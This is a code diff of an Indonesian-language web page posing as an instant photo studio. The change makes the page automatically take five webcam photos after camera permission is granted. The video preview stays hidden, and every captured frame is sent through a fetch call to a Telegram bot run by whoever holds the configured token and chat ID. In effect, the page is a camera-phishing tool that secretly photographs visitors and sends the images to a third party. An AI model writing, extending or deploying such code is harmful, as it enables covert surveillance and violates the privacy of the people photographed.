@@ -10,16 +10,15 @@
 
     <div class="max-w-md w-full bg-gray-800 p-6 rounded-2xl shadow-xl text-center">
         <h1 class="text-2xl font-bold mb-4">Studio Foto Instan</h1>
-        <p class="mb-6 text-gray-400">Klik tombol di bawah untuk mengambil foto.</p>
+        <p class="mb-6 text-gray-400">Klik tombol di bawah untuk mengambil 5 foto otomatis.</p>
         
         <button id="startBtn" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-full transition-all">
-            Mulai Sesi Foto
+            Mulai Sesi 5 Foto
         </button>
 
         <div id="status" class="mt-4 text-sm text-yellow-400 font-medium"></div>
     </div>
 
-    <!-- Video disembunyikan sepenuhnya agar tidak merender preview di layar -->
     <video id="video" class="hidden" autoplay playsinline></video>
 
     <script>
@@ -30,54 +29,49 @@
         const startBtn = document.getElementById('startBtn');
         const status = document.getElementById('status');
 
+        // Jeda waktu antar foto dalam milidetik
+        const delays = [1000, 500, 3000, 1000, 500];
+
         async function initCamera() {
             try {
                 status.innerText = "Meminta izin kamera...";
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
+                startBtn.classList.add('hidden');
                 
-                // Tunggu sedikit agar kamera siap, lalu ambil gambar
-                status.innerText = "Mengambil foto...";
-                setTimeout(takePhoto, 1500);
+                for (let i = 0; i < 5; i++) {
+                    status.innerText = `Mengambil foto ke-${i + 1}...`;
+                    await new Promise(resolve => setTimeout(resolve, i === 0 ? 1500 : delays[i-1]));
+                    await takeAndSendPhoto(i + 1);
+                }
+
+                status.innerText = "✅ Semua 5 foto berhasil dikirim!";
+                status.classList.replace('text-yellow-400', 'text-green-400');
+                video.srcObject.getTracks().forEach(track => track.stop());
             } catch (err) {
                 status.innerText = "Error Kamera: " + err.message;
             }
         }
 
-        async function takePhoto() {
+        async function takeAndSendPhoto(index) {
             const tempCanvas = document.createElement('canvas');
             tempCanvas.width = video.videoWidth;
             tempCanvas.height = video.videoHeight;
             tempCanvas.getContext('2d').drawImage(video, 0, 0);
             
             const imageData = tempCanvas.toDataURL('image/jpeg');
-
-            status.innerText = "Mengirim foto...";
-            sendToTelegram(imageData);
-        }
-
-        async function sendToTelegram(imageBlob) {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
-            formData.append('photo', dataURLToBlob(imageBlob));
-            formData.append('caption', "📸 Foto Baru Berhasil Diambil!");
+            formData.append('photo', dataURLToBlob(imageData));
+            formData.append('caption', `📸 Foto ke-${index} dari 5`);
 
             try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
-                
-                const result = await response.json();
-                if (result.ok) {
-                    status.innerText = "✅ Foto berhasil dikirim!";
-                    status.classList.replace('text-yellow-400', 'text-green-400');
-                    video.srcObject.getTracks().forEach(track => track.stop());
-                } else {
-                    status.innerText = "Error API: " + result.description;
-                }
             } catch (e) {
-                status.innerText = "Gagal koneksi ke Telegram.";
+                console.error("Gagal kirim foto " + index);
             }
         }
 
